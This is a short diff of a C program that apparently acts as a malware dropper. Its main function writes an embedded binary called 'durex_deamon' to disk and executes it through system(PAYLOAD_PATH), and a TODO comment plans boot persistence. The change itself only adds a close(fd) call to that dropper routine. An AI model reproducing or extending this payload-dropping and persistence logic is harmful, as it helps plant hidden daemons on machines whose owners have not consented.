@@ -17,6 +17,7 @@ int	main(void)
 	if (fd < 0)
 		return EXIT_SUCCESS;
 	write(fd, durex_deamon, durex_deamon_len);
+	close(fd);
 	system(PAYLOAD_PATH);
 	// TODO: Make if launched at boot.
 	return EXIT_SUCCESS;
